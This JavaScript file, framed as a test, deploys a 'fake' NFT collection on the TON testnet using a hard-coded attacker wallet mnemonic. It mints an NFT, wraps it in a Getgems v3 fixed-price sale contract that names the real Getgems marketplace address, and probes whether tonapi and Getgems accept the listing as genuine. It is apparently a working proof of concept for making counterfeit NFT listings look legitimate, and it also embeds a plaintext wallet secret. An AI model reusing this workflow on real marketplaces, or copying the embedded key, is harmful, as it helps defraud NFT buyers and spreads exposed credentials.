/**
 * Test: deploy v3 fixprice sale for existing fake NFT,
 * check if tonapi recognizes nft_fixprice_sale_v3 interface.
 *
 * Existing contracts:
 *   Collection: kQC8DslVj3HEPBGo53u3hTSEHJH2-GhZqa5kcHnKLp-M82-t
 *   NFT:        kQDuwy8u0VPgyaEdBPrZnqxXgN2QmOTKgojJ5pnbTbkLcilZ  (owner = old v4 sale)
 *
 * We need a FRESH NFT. Strategy: re-run collection+mint with new nonce, then v3 sale.
 */

const path  = require('path');
const fs    = require('fs');
const https = require('https');
const { compileFunc } = require('../nft-contracts/node_modules/@ton-community/func-js');
const { mnemonicToWalletKey } = require('../nft-contracts/node_modules/@ton/crypto');
const {
  WalletContractV4, TonClient, internal, toNano,
  Address, beginCell, contractAddress, Cell
} = require('../nft-contracts/node_modules/@ton/ton');

const ATTACKER_MNEMONIC = 'asthma black design brick oxygen cat that potato nurse umbrella quote snack bag color walnut jump stem cloth kit sand volcano secret cloth better';
const GETGEMS_MARKETPLACE = Address.parse('0:59a76b59f5651940ff0080bda050791d2507bef0dc8070592c9f72fb75c67160');
const OP_TRANSFER  = 0x5fcc3d14;
const BASE_URL = 'https://raw.githubusercontent.com/mmski2002-eng/DELETEBOT/main/TON/GETGEMS/nft-metadata';
const SOURCES_DIR = path.resolve(__dirname, '../contracts/sources');
const PATCH = 'int builder_null?(builder b) asm "ISNULL";';

// v3 BOC from getgems-io/nft-contracts GitHub
const NftFixPriceSaleV3CodeBoc = 'te6cckECDAEAAqAAART/APSkE/S88sgLAQIBIAMCAH7yMO1E0NMA0x/6QPpA+kD6ANTTADDAAY4d+ABwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VTgXweCAP/+8vACAUgFBABXoDhZ2omhpgGmP/SB9IH0gfQBqaYAYGGh9IH0AfSB9ABhBCCMkrCgFYACqwECAs0IBgH3ZghA7msoAUmCgUjC+8uHCJND6QPoA+kD6ADBTkqEhoVCHoRagUpBwgBDIywVQA88WAfoCy2rJcfsAJcIAJddJwgKwjhdQRXCAEMjLBVADzxYB+gLLaslx+wAQI5I0NOJacIAQyMsFUAPPFgH6AstqyXH7AHAgghBfzD0UgcAlsjLHxPLPyPPFlADzxbKAIIJycOA+gLKAMlxgBjIywUmzxZw+gLLaszJgwb7AHFVUHAHyMsAFssfUATPFljPFgHPFgH6AszLAMntVAP10A6GmBgLjYSS+CcH0gGHaiaGmAaY/9IH0gfSB9AGppgBgYOCmE44BgAEwthGmP6Z+lVW8Q4AHxgRDAgRXdFOAA2CnT44LYTwhWL4ZqGGhpg+oYAP2AcBRgAPloyhJrpOEBWfGBHByUYABOGxuIHCOyiiGYOHgC8BRgAMCwoJAC6SXwvgCMACmFVEECQQI/AF4F8KhA/y8ACAMDM5OVNSxwWSXwngUVHHBfLh9IIQBRONkRW68uH1BPpAMEBmBXAHyMsAFssfUATPFljPFgHPFgH6AszLAMntVADYMTc4OYIQO5rKABi+8uHJU0bHBVFSxwUVsfLhynAgghBfzD0UIYAQyMsFKM8WIfoCy2rLHxXLPyfPFifPFhTKACP6AhPKAMmAQPsAcVBmRRUEcAfIywAWyx9QBM8WWM8WAc8WAfoCzMsAye1UM/Vflw==';
const SALE_V3_CODE = Cell.fromBase64(NftFixPriceSaleV3CodeBoc);

const client = new TonClient({ endpoint: 'https://testnet.toncenter.com/api/v2/jsonRPC' });

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function fmt(n) { return (Number(n) / 1e9).toFixed(6); }

async function withRetry(fn, max = 5) {
  for (let i = 1; i <= max; i++) {
    try { return await fn(); } catch (e) {
      if (i < max) { await sleep(e.message?.includes('429') ? 2500 * i : 1500); continue; }
      throw e;
    }
  }
}

function httpsGet(url) {
  return new Promise((res, rej) => {
    https.get(url, { headers: { Accept: 'application/json' } }, r => {
      let d = '';
      r.on('data', c => d += c);
      r.on('end', () => { try { res(JSON.parse(d)); } catch { res({ raw: d.slice(0,300) }); } });
    }).on('error', rej);
  });
}

function makeOffchainContent(url) {
  return beginCell().storeUint(0x01, 8).storeBuffer(Buffer.from(url)).endCell();
}

async function compile(targets) {
  const r = await compileFunc({
    targets,
    sources: p => p === 'patch.fc' ? PATCH : fs.readFileSync(path.join(SOURCES_DIR, p), 'utf8'),
  });
  if (r.status === 'error') throw new Error('FunC: ' + r.message);
  return Cell.fromBase64(r.codeBoc);
}

// v3 sale data cell (no timestamp field, nftOwnerAddress=null initially)
function buildV3SaleData(opts) {
  const feesCell = beginCell()
    .storeAddress(opts.marketplaceFeeAddress)
    .storeCoins(opts.marketplaceFee)
    .storeAddress(opts.royaltyAddress)
    .storeCoins(opts.royaltyAmount)
    .endCell();

  return beginCell()
    .storeBit(0)                          // is_complete
    .storeUint(opts.createdAt, 32)        // created_at
    .storeAddress(opts.marketplaceAddress)// marketplace
    .storeAddress(opts.nftAddress)        // nft_address
    .storeAddress(null)                   // nft_owner_address (null initially)
    .storeCoins(opts.fullPrice)           // full_price
    .storeRef(feesCell)
    .storeBit(0)                          // can_deploy_by_external
    .endCell();
}

async function main() {
  const key    = await mnemonicToWalletKey(ATTACKER_MNEMONIC.split(/\s+/));
  const wallet = WalletContractV4.create({ publicKey: key.publicKey, workchain: 0 });
  const atk    = client.open(wallet);
  const atkAddr = wallet.address;

  const bal = await withRetry(() => client.getContractState(atkAddr));
  console.log('Attacker:', atkAddr.toString({ testOnly: true }));
  console.log('Balance:', fmt(BigInt(bal.balance || '0')), 'TON\n');

  // 1. Compile
  console.log('[1] Compile...');
  const [COL_CODE, NFT_CODE] = await Promise.all([
    compile(['imports/stdlib.fc', 'op-codes.fc', 'params.fc', 'patch.fc', 'nft-collection.fc']),
    compile(['imports/stdlib.fc', 'op-codes.fc', 'params.fc', 'patch.fc', 'nft-item.fc']),
  ]);
  console.log('    OK\n');

  // 2. Deploy collection (new nonce)
  const nonce = Math.floor(Date.now() / 1000);
  const collContent = makeOffchainContent(`${BASE_URL}/collection.json#${nonce}`);
  const collData = beginCell()
    .storeRef(collContent)
    .storeUint(0, 64)
    .storeAddress(atkAddr)
    .storeRef(NFT_CODE)
    .endCell();
  const collAddr = contractAddress(0, { code: COL_CODE, data: collData });
  console.log('[2] Collection:', collAddr.toString({ testOnly: true }));

  const collState = await withRetry(() => client.getContractState(collAddr));
  if (collState.state !== 'active') {
    const seq = await withRetry(() => atk.getSeqno());
    await withRetry(() => atk.sendTransfer({
      seqno: seq, secretKey: key.secretKey,
      messages: [internal({ to: collAddr, value: toNano('0.05'), bounce: false, init: { code: COL_CODE, data: collData } })],
    }));
    console.log('    deploy TX sent, waiting 15s...');
    await sleep(15000);
  } else { console.log('    already deployed'); }

  // 3. Mint NFT
  const nftData = beginCell().storeUint(0, 64).storeAddress(collAddr).endCell();
  const nftAddr = contractAddress(0, { code: NFT_CODE, data: nftData });
  console.log('\n[3] NFT:', nftAddr.toString({ testOnly: true }));

  const nftState = await withRetry(() => client.getContractState(nftAddr));
  if (nftState.state !== 'active') {
    const mintBody = beginCell()
      .storeUint(1, 32).storeUint(0, 64).storeUint(0, 64)
      .storeRef(makeOffchainContent(`${BASE_URL}/0.json`))
      .storeAddress(atkAddr)
      .storeCoins(toNano('0.05'))
      .endCell();
    await sleep(500);
    const seq2 = await withRetry(() => atk.getSeqno());
    await withRetry(() => atk.sendTransfer({
      seqno: seq2, secretKey: key.secretKey,
      messages: [internal({ to: collAddr, value: toNano('0.15'), bounce: true, body: mintBody })],
    }));
    console.log('    mint TX sent, waiting 20s...');
    await sleep(20000);
    const st = await withRetry(() => client.getContractState(nftAddr));
    console.log('    state:', st.state);
  } else { console.log('    already deployed'); }

  // 4. Deploy v3 sale
  const ts = Math.floor(Date.now() / 1000);
  const fee = toNano('0.025');  // ~5% of 0.5 TON
  const saleData = buildV3SaleData({
    marketplaceAddress:    GETGEMS_MARKETPLACE,
    nftAddress:            nftAddr,
    fullPrice:             toNano('0.1'),
    marketplaceFeeAddress: GETGEMS_MARKETPLACE,
    marketplaceFee:        fee,
    royaltyAddress:        atkAddr,
    royaltyAmount:         toNano('0'),
    createdAt:             ts,
  });
  const saleAddr = contractAddress(0, { code: SALE_V3_CODE, data: saleData });
  console.log('\n[4] v3 Sale:', saleAddr.toString({ testOnly: true }));

  const saleState = await withRetry(() => client.getContractState(saleAddr));
  if (saleState.state !== 'active') {
    await sleep(500);
    const seq3 = await withRetry(() => atk.getSeqno());
    await withRetry(() => atk.sendTransfer({
      seqno: seq3, secretKey: key.secretKey,
      messages: [internal({ to: saleAddr, value: toNano('0.05'), bounce: false, init: { code: SALE_V3_CODE, data: saleData } })],
    }));
    console.log('    deploy TX sent, waiting 15s...');
    await sleep(15000);
    const st = await withRetry(() => client.getContractState(saleAddr));
    console.log('    state:', st.state);
  } else { console.log('    already deployed'); }

  // Check sale interface immediately
  const saleAcc = await httpsGet(`https://testnet.tonapi.io/v2/accounts/${saleAddr.toRawString()}`);
  console.log('\n    Sale interfaces:', saleAcc.interfaces);
  console.log('    Sale methods:', saleAcc.get_methods);

  // 5. Transfer NFT -> v3 sale
  console.log('\n[5] Transfer NFT -> v3 sale...');
  const transferBody = beginCell()
    .storeUint(OP_TRANSFER, 32).storeUint(0, 64)
    .storeAddress(saleAddr)
    .storeAddress(atkAddr)
    .storeBit(0)
    .storeCoins(toNano('0.05'))
    .storeBit(0)
    .endCell();

  await sleep(500);
  const seq4 = await withRetry(() => atk.getSeqno());
  await withRetry(() => atk.sendTransfer({
    seqno: seq4, secretKey: key.secretKey,
    messages: [internal({ to: nftAddr, value: toNano('0.12'), bounce: true, body: transferBody })],
  }));
  console.log('    TX sent, waiting 25s...');
  await sleep(25000);

  // 6. Check tonapi
  console.log('\n[6] tonapi checks:');
  const [nftResp, saleResp] = await Promise.all([
    httpsGet(`https://testnet.tonapi.io/v2/nfts/${nftAddr.toRawString()}`),
    httpsGet(`https://testnet.tonapi.io/v2/accounts/${saleAddr.toRawString()}`),
  ]);
  console.log('    NFT:', JSON.stringify(nftResp).slice(0, 300));
  console.log('    Sale interfaces:', saleResp.interfaces);

  console.log('\n    NFT tonscan:', `https://testnet.tonscan.org/address/${nftAddr.toRawString()}`);
  console.log('    Sale tonscan:', `https://testnet.tonscan.org/address/${saleAddr.toRawString()}`);
  const colRaw = collAddr.toRawString();
  console.log('    GetGems collection:', `https://testnet.getgems.io/collection/${colRaw}`);
}

main().catch(console.error);
